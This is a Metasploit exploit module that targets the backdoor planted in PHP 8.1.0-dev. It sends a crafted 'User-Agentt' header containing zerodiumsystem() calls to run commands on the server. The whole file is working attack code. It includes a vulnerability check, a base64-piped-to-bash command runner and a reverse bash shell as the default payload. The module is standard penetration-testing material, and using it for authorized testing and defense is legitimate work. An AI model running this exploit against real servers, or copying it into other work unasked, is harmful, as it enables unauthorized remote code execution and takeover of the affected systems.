##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => "PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution",
        'Description' => %q{
          This module can detect and exploit the backdoor of php-8.1-dev.
        },
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'flast101', # POC
            'Gaurav Purswani' # @pingport80 (Metasploit Module)
          ],
        'Platform' => %w[unix win],
        'Arch' => ARCH_CMD,
        'Targets' =>
            [
              [
                'Unix (in-memory)',
                {
                  'Platform' => 'unix',
                  'Arch' => ARCH_CMD,
                  'Type' => :unix_memory,
                  'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }
                }
              ],
              [
                'Windows (CMD In-Memory)',
                {
                  'Platform' => 'windows',
                  'Arch' => ARCH_CMD,
                  'Type' => :windows_cmd,
                  'DefaultOptions' => {
                    'PAYLOAD' => 'cmd/windows/generic',
                    'DisablePayloadHandler' => true
                  }
                }
              ]
            ],
        'References' =>
          [
            ['https://flast101.github.io/php-8.1.0-dev-backdoor-rce/'], # original writeup
            ['https://news-web.php.net/php.internals/113838 '], # PHP's official statement
            ['https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d'], # malicious commit which added the backdoor
            ['https://github.com/php/php-src/commit/8d743d5281c29e9750e183804b7ba02e1ff82f0b']  # commit which resolved it
          ],
        'Notes' => {
          'Stability' => [],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => []
        },
        'Privileged' => false,
        'DisclosureDate' => '2021-05-23',
        'DefaultTarget' => 0
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to the target file on the system', '/index.php'])
      ]
    )
  end

  def payload_unix
    encoded_payload = Base64.strict_encode64(payload.encoded)
    "echo -n #{encoded_payload} | /bin/base64 -d | /bin/bash"
  end

  def payload_win
   "cmd.exe /q /c #{payload.encoded}"
  end

  def check
    uri = target_uri.path
    fingerprint = Rex::Text.rand_text_alpha(8)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(uri),
      'headers' => {
        'Accept-Encoding' => 'gzip,deflate',
        'User-Agentt' => "zerodiumsystem('echo #{fingerprint}');"
      }
    })

    if res && res.code == 200 && res.body.to_s.include?(fingerprint)
     Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end

  def send_command(cmd)
    uri = target_uri.path
    return send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(uri),
      'headers' => {
        'Accept-Encoding' => 'gzip,deflate',
        'User-Agentt' => "zerodiumsystem('#{cmd}');"
      }
    })
  end

  def exploit
    print_good('Sending shellcode')
    if target['Platform'] == 'unix'
      send_command(payload_unix)
    else
      send_command(payload_win)
    end
  end
end
